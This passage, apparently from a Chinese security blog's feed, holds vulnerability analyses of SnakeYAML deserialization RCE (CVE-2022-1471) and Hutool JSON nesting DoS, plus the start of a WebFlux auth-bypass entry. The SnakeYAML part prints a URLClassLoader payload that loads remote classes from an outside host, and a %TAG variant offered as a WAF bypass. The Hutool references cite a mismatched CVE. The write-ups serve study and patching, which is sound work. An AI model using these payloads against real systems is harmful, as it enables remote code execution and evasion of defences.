+<p>我们首先关注getSingleNode方法。进入该方法会首先通过解析器对事件进行配置</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164458986.png" alt="image-20230814164458986"></p>
+<p>可以看到获取事件时其实时同故宫state对象进行创建的，而state对象其实是一个Production接口的实例。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164703271.png" alt="image-20230814164703271"></p>
+<p>其有很多的实现类，分别对应不同的节点类型的不同处理阶段。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814164959202.png" alt="image-20230814164959202"></p>
+<p>我们在初始化解析器的时候会初始化state对下个为ParseStreamStart的实例</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814165131638.png" alt="image-20230814165131638"></p>
+<p>故此处调用的produce方法即是<code>org.yaml.snakeyaml.parser.ParserImpl.ParseStreamStart#produce</code>，在该方法中获取了获取了流解析开始事件并重置了state为下一阶段的隐式文档解析开始状态。每一个事件中都包含两个重要的标志Mark，一个称之为startMark一个称之为endMark，分别标识了当前事件处理的开始与结束位置</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814165258362.png" alt="image-20230814165258362"></p>
+<p>在获取到事件后，判断事件是否为流结束事件，若不是则进入到节点解析逻辑。在此逻辑开始时会调用getEvent方法获取一个开始事件，待composeNode方法调用完毕后，再嗲用getEvent方法获取到一个结束事件，最后对锚点与记录的递归节点进行清理。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814170038625.png" alt="image-20230814170038625"></p>
+<p>在composeNode方法中主要有两个分支，如果你的序列化数据设置了锚点与别名此时会进入第一个分支，若没有则会进入到else分支，我们这里会进入到else分支。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814170426979.png" alt="image-20230814170426979"></p>
+<p>在else分支中还是首先会把事件往前推一次，获得的NodeEvent主要包含三种类型分别为ScalarNode SequenceNode MappingNode，即我们开始谈到的Yaml格式的三种类型标量、序列以及映射，很明显我们这里会进入到序列的处理逻辑里面。</p>
+<p>在composeSequenceNode方法中首先设置事件为SequenceStartEvent，即序列处理开始，然后会尝试获取Tag，关于tag的内容可以在<a href="https://yaml.org/spec/1.2.2/#tag-shorthands%E4%BA%86%E8%A7%A3%EF%BC%8C%E7%84%B6%E5%90%8E%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AASequenceNode%E5%AF%B9%E8%B1%A1%EF%BC%8C%E5%9C%A8%E6%9E%84%E9%80%A0SequenceNode%E5%AF%B9%E8%B1%A1%E6%97%B6%E4%BC%9A%E5%B0%86children%E5%BD%93%E4%BD%9C%E5%8F%82%E6%95%B0%E4%BC%A0%E8%BF%9B%E5%8E%BB%E8%B5%8B%E5%80%BC%E7%BB%99%E5%B1%9E%E6%80%A7this.value%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9F%A5%E9%81%93ArrayList%E6%98%AF%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%8B%A5%E4%BB%A5%E5%A4%96%E7%A7%92%E5%AF%B9children%E7%9A%84%E4%BF%AE%E6%94%B9%E5%B0%86%E5%BD%B1%E5%93%8D%E5%88%B0SequenceNode%E4%B8%AD%E7%9A%84%E5%80%BC%E3%80%82%E7%84%B6%E5%90%8E%E5%97%B2%E7%94%A8composeNode%E6%96%B9%E6%B3%95%E7%BB%A7%E7%BB%AD%E8%BF%9B%E8%A1%8C%E8%8A%82%E7%82%B9%E5%90%8E%E8%A7%81%E5%B9%B6%E6%B7%BB%E5%8A%A0%E5%88%B0children%E4%B8%AD%E4%BD%9C%E4%B8%BASequenceNode%E7%9A%84%E5%AD%90%E8%8A%82%E7%82%B9%E3%80%82%E5%88%B0%E8%BF%99%E9%87%8C%E5%B0%B1%E5%B7%B2%E7%BB%8F%E5%BC%80%E5%A7%8B%E9%80%92%E5%BD%92%E8%A7%A3%E6%9E%90%E4%BA%86%EF%BC%8C%E7%9B%B4%E5%88%B0%E8%A7%A3%E6%9E%90%E5%88%B0StreamEnd%E3%80%82">https://yaml.org/spec/1.2.2/#tag-shorthands了解，然后创建一个SequenceNode对象，在构造SequenceNode对象时会将children当作参数传进去赋值给属性this.value，我们知道ArrayList是引用类型，若以外秒对children的修改将影响到SequenceNode中的值。然后嗲用composeNode方法继续进行节点后见并添加到children中作为SequenceNode的子节点。到这里就已经开始递归解析了，直到解析到StreamEnd。</a></p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814170947063.png" alt="image-20230814170947063"></p>
+<p>在获取到Node后，就进入到目标对象构建的流程中</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814172249327.png" alt="image-20230814172249327"></p>
+<p>在constructObject方法中还对获取到的node对象进行了缓存检查</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814172306770.png" alt="image-20230814172306770"></p>
+<p>在调用getConstructor时会首先从预设好的13中内置构造器中尝试选择，若没有匹配的则返回一个ConstructYamlObject的构造器，然后调用器ConstructYamlObject的getConstructor方法通过反射的方式获得目标类的Class实例，然后根据Node类型获取到不同的几点构造器，此处为ContructSequence</p>
+<p>然后调用器construct方法，该方法也时通过节点tag的不同类型选择不同的处理逻辑，这里会进入到可变对象的对象构建逻辑中。由下图，在这个逻辑中会首先获取当前Node的value属性，也就是子节点的尺寸然后与获得的目标类的构造方法的参数尺寸进行比较，若成功匹配则依次对直接点调用constructObjec递归构建对象然后作为父节点的构造方法参数传参同通过反射的方式进行实例化。</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814173636570.png" alt="image-20230814173636570"></p>
+<p>在我们提供的payload中，也就是最终我们要构建的类是javax.script.ScriptEngineManager，构造该类调用的是其含有一个参数的有参构造方法，其参数为一个类加载器java.net.URLClassLoader，而在构造java.net.URLClassLoader时也是调用其含有一个参数的有参构造方法不过其参数时一个数组，所以我们会考到java.net.URLClassLoader后嵌套了两层[[，其数组类型为java.net.URL。我们知道URLClassLoader会从传入的URL进行远程的类加载工作，那么这个payload极有可能涉及到远程恶意类加载与实例化。那么ScriptEngineManager的构造方法又做了什么呢</p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814174418936.png" alt="image-20230814174418936"></p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814174500741.png" alt="image-20230814174500741"></p>
+<p><img src="/2025/04/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2022-1471/image-20230814174437825.png" alt="image-20230814174437825"></p>
+<p>可以看到这是一个很明显的SPI调用过程，我们只需要在远程部署一个实现了ScriptEngineFactory接口的类，并子啊其静态代码块中写入命令执行的代码，并在其Classpath:META-INFO&#x2F;services&#x2F;javax.script.ScriptEngineFactory文件中应用该实现类即可完成利用。具体的远程RCE可以上网自行寻找。</p>
+<p>在最新版的snake中该漏洞得到了修复，官方通过在loadConfigs对象中引入了新的配置项并且限制了反序列化递归调用嵌套深度的方式来对反序列化漏洞进行了限制。</p>
+<p>限制递归深度在org.yaml.snakeyaml.composer.Composer#increaseNestingDepth方法中检查，最大深度默认为50层</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814193403071.png" alt="image-20230814193403071"></p>
+<p>目标类类型检查在下图处检查，首先节点Tag是否是自定义的全局tag如果是则调用org.yaml.snakeyaml.inspector.TagInspector#isGlobalTagAllowed方法进行检查，TagInspector是一个接口，其默认实现是org.yaml.snakeyaml.inspector.UnTrustedTagInspector。isGlobalTagAllowed方法默认返回false，即不允许使用全局的Tag。</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814193503552.png" alt="image-20230814193503552"></p>
+<p>我们在编写代码的时候如果需要指定发序列化的目标类类型则必须要实现TagInspector接口，重写isGlobalTagAllowed方法，然后将其注入到LoaderOptions实例化对象中。</p>
+<p>默认不允许使用全局tag</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194127911.png" alt="image-20230814194127911"></p>
+<p>实现TagInspector接口，此处直接返回true，也可以在isGlobalTagAllowed方法中根据tag来进行逻辑判断决定允许哪些类能被反序列化。</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194330452.png" alt="image-20230814194330452"></p>
+<p>重写isGlobalTagAllowed方法后的结果</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194609615.png" alt="image-20230814194609615"></p>
+<p>远程类加载</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814194851114.png" alt="image-20230814194851114"></p>
+<p>在分析的过程中我发现了一些好玩的地方，手下时除了load方法可以利用该payload外，如果我们使用的时loadAs方法被人制定了目标类的类型应该怎么办？</p>
+<p>当然如果类型不匹配，即ScriptEngineFactory如果不是目标类的子类或这实现类，就没得玩，但是如果是一些抽象级别比较高的类还是大有可为的，比如xxxx组件就是这么干的，嗯一个CVE到手了。</p>
+<p>两外我们可以利用Yaml语法中的TAG特性来实现WAF绕过，我们只需要对payload进行以下的变形</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">%TAG</span> <span class="type">!m</span><span class="string">!</span> <span class="string">tag:yaml.org,2002:java</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="type">!m!x.script.ScriptEngineManager</span> [<span class="type">!m!.net.URLClassLoader</span> [[<span class="type">!m!.net.URL</span> [<span class="string">&quot;http://i0hrz1.dnslog.cn&quot;</span>]]]]</span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
+
+<p>依旧RCE，还可以用来绕WAF</p>
+<p><img src="/assets/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-1471%EF%BC%89/image-20230814195046711.png" alt="image-20230814195046711"></p>
+<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
+<li>升级软件到不受影响的版本或最新版，最新版maven仓库地址：<a href="https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1%E3%80%82">https://mvnrepository.com/artifact/org.yaml/snakeyaml/2.1。</a></li>
+<li>限制服务器出网</li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1471</a></li>
+<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2022-1471">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2022-1471</a></li>
+<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-1471</a></li>
+<li><a href="https://www.cnblogs.com/nice0e3/p/14514882.html">https://www.cnblogs.com/nice0e3/p/14514882.html</a></li>
+<li><a href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/">https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/</a></li>
+<li><a href="https://www.cnblogs.com/R0ser1/p/16213257.html">https://www.cnblogs.com/R0ser1/p/16213257.html</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
+        <tag>反序列化</tag>
+        <tag>网络安全</tag>
+        <tag>漏洞分析</tag>
+        <tag>漏洞</tag>
+        <tag>SnakeYaml</tag>
+        <tag>CVE-2022-1471</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）</title>
+    <url>/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/</url>
+    <content><![CDATA[<h1 id="Hutool-JSONUtil拒绝服务漏洞（CVE-2022-45690-CVE-2022-45689）"><a href="#Hutool-JSONUtil拒绝服务漏洞（CVE-2022-45690-CVE-2022-45689）" class="headerlink" title="Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）"></a>Hutool JSONUtil拒绝服务漏洞（CVE-2022-45690 CVE-2022-45689）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p><code>Hutool</code>是一个功能丰富且易用的<strong>Java工具库</strong>，通过诸多实用工具类的使用，旨在帮助开发者快速、便捷地完成各类开发任务。 这些封装的工具涵盖了字符串、数字、集合、编码、日期、文件、IO、加密、数据库JDBC、JSON、HTTP客户端等一系列操作， 可以满足各种不同的开发需求。</p>
+<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>CVE-2022-45690： 该项目受影响版本存在拒绝服务漏洞，由于org.json.JSONTokener.nextValue::JSONTokener.java组件中并未检验json的嵌套深度。攻击者可以通过构造特制的JSON或XML数据在程序解析时导致JVM溢出从而实现拒绝服务(DoS)攻击。</p>
+<p>CVE-2022-45689：该项目受影响版本存在拒绝服务漏洞，由于JSONObject.java中JSONObject方法对于要解析的json并未检验是否合法，在后续解析JSON时就会因为内存不足而造成拒绝服务漏洞。</p>
+<span id="more"></span>
+
+<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>&lt; Hutool 5.8.11</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入<code>hutool</code>包</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811111844774.png" alt="image-20230811111844774"></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hutool-all-version</span>&gt;</span>5.7.22<span class="tag">&lt;/<span class="name">hutool-all-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;hutool-all-version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>编写测试类</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811112000265.png" alt="image-20230811112000265"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;json_str&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSONUtil.parseObj(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一般我们复现漏洞时都需要利用一些泄露的有关漏洞的信息，比如别人发的通告中未打码完全的截图、漏洞描述等信息，这里我们从阿里云漏洞库的描述中了解到该漏洞的大致情况：</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811112316260.png" alt="image-20230811112316260"></p>
+<p>里面有两个关键信息，一是嵌套深度、二是栈溢出，那这不妥妥的无线递归导致的栈溢出漏洞吗？先整2000层嵌套打一下试试：</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811133440365.png" alt="image-20230811133440365"></p>
+<p>果然栈溢出了，打完收工，回家吹空调了。</p>
+<p>啥？你说这太简单了，你想学点硬货？行，那咱上硬货。</p>
+<p>这个漏洞分析第一步肯定时先把断点打起来，我们发现所谓的<code>parseObj</code>其实就是new了一个<code>JSONObject</code>对象。</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811133657015.png" alt="image-20230811133657015"></p>
+<p>创建对象时会调用<code>init</code>方法，在该方法中会根据我们输入的参数类型选择不同的重载函数进行解析，我们输入的时个字符串，所以会进入到第680行的逻辑里。</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811133906215.png" alt="image-20230811133906215"></p>
+<p>这里干的什么注释说的已经很清楚了</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811134053659.png" alt="image-20230811134053659"></p>
+<p>这里有两个函数解释以下，首先时<code>nextClean</code>会去获取json字符串的token也就是<code>&quot; &#123; &#125; : [ ]</code>这一些，<code>nextValue</code>会去获取json字符串键对应的值。这个漏洞就出现在757行将json的键值对，往JSONObject对象里放的时候，在获取json值得时候会调用netValue函数。</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811134202285.png" alt="image-20230811134202285"></p>
+<p>这个函数会根据从<code>:</code>后解析到得第一个token类型去调用不同得逻辑，当解析的token为<code>&#123;</code>时就会再new一个JSONObject对象。啊，这这这，这不就递归了吗？</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811134541231.png" alt="image-20230811134541231"></p>
+<p>我们知道递归过程中函数会不断地压栈，而栈空间是有限地，如果不断地压栈而不弹栈地话就会导致栈溢出，所以需要一个基例来帮助函数解析到最深处能够回退，而在json字符串解析过程中就是当解析到最后一个<code>&#123;</code>时开始回退。但是这个json字符串地长度再这里我们若是可以控制地话，就可以先搞几万层嵌套让它一直压栈直到溢出为止，因为再分析过程中并没有看到代码中有对嵌套深度地限制。</p>
+<p>这个漏洞是栈溢出漏洞，而（CVE-2022-45689）确实一个实打实得堆溢出漏洞，一般来说堆溢出时非常少见得，应为JVM堆是非常大的，我们可以使用下面的代码答应一下一个普通的java程序运行时JVM可用的堆内存情况。</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811152225458.png" alt="image-20230811152225458"></p>
+<p>从结果来看JVM初始化时使用的总的堆内存为241MB，而可用的最到堆内存达到3GB，一般来说时很难发生溢出的。我们知道，JVM堆内存中一般存储的时java对象，要想要JVM堆发生溢出也就是说要有大量的没有被GC回收的对象占满了内存，但是如果只是单纯得常见对象，这些对象在沾满了幸存者0区后会被GC清除掉，一般也不会导致堆溢出，除非这些对象时不可清除得，那么什么情况下得对象时不可清除得呢。GC在进行垃圾回收时可以采用多种策略，其中包括引用计数法，即查看一个对象是否有被别得对象引用，如果没有则可以清除，如果有则不清除，但是这个算法有缺陷解决不了循环引用得问题，所以又有了可达性分析算法，及从一系列得GC Roots开始分析一个对象得可达性，如果这个对象不可达则进行清除。在这个例子中进行JSONObject解析递归到最深层进行返回时，每一个<code>&#123;xx:1&#125;</code>都将被new为一个新的<code>JSONObject</code>对象并被不断地引用嵌套，最终所有的<code>JSONObject</code>对象一起链接在一起占满了堆内存，我们可以使用jconsole来观察一下JVM的堆内存变化情况：</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811153435062.png" alt="image-20230811153435062"></p>
+<p>jconsole可能不太直观，可以下载<code>virtual VM</code>进行监控</p>
+<p>下载地址：<a href="https://github.com/oracle/visualvm/releases/download/2.1.6/visualvm_216.zip">https://github.com/oracle/visualvm/releases/download/2.1.6/visualvm_216.zip</a></p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811154033340.png" alt="image-20230811154033340"></p>
+<p>最开始我们的程序休眠了20秒（为了给jconsole链接提供时间）休眠结束后开始进行json字符串的解析，开始阶段应为还没有递归到最深处所以堆内存增加量不大，在递归达到最深处函数不断返回时，堆内存空间的消耗不断走高，最终耗尽内存资源导致堆溢出。我们把高峰期的堆内存dump出来</p>
+<p><img src="/2025/04/10/Hutool-JSONUtil%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-CVE-2022-45690-CVE-2022-45689/image-20230811154905943.png" alt="image-20230811154905943"></p>
+<p>可以看到足足1.7G的内存都被我们的json字符串占据。</p>
+<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><ol>
+<li>升级软件到不受影响的版本或最新版，官方仓库地址：<a href="https://github.com/dromara/hutool/releases%E3%80%82">https://github.com/dromara/hutool/releases。</a></li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37582</a></li>
+<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-37582">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-37582</a></li>
+<li><a href="https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582">https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2023-37582</a></li>
+<li><a href="https://avd.aliyun.com/detail?id=AVD-2022-45689">https://avd.aliyun.com/detail?id=AVD-2022-45689</a></li>
+<li><a href="https://github.com/dromara/hutool/issues/2746">https://github.com/dromara/hutool/issues/2746</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>漏洞分析</tag>
+        <tag>漏洞</tag>
+        <tag>Hutool</tag>
+        <tag>JSONUtil拒绝服务漏洞</tag>
+        <tag>CVE-2022-45690</tag>
+        <tag>CVE-2022-45689</tag>
+        <tag>DoS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WebFlux Security 认证绕过（CVE-2023-34034）</title>
+    <url>/2025/04/10/WebFluxSecurity-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2023-34034/</url>
+    <content><![CDATA[<h1 id="WebFlux-Security-认证绕过（CVE-2023-34034）"><a href="#WebFlux-Security-认证绕过（CVE-2023-34034）" class="headerlink" title="WebFlux Security 认证绕过（CVE-2023-34034）"></a>WebFlux Security 认证绕过（CVE-2023-34034）</h1><h2 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h2><p>Spring WebFlux 是 Spring Framework 5.0 中引入的新的响应式Web框架。与Spring MVC不同，它不需要Servlet API，是完全异步且非阻塞的，并且通过Reactor项目实现了Reactive Streams规范。Spring WebFlux 可用于创建基于事件循环执行模型的完全异步且非阻塞的应用程序。</p>
+<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>当WebFlux使用了Spring Security进行用户认证与鉴权时，若错误地使用了无前导”&#x2F;“的路径通配符”**“，程序将因为WebFlux与Spring Security对其不同的解析模式差异导致可能的认证绕过。</p>
+<span id="more"></span>
+
+<h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><ul>
+<li>6.1.0 to 6.1.1</li>
+<li>6.0.0 to 6.0.4</li>
+<li>5.8.0 to 5.8.4</li>
+<li>5.7.0 to 5.7.9</li>
+<li>5.6.0 to 5.6.11</li>
+</ul>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>使用idea新建基于maven的java项目，在pom.xml中引入相关依赖包</p>
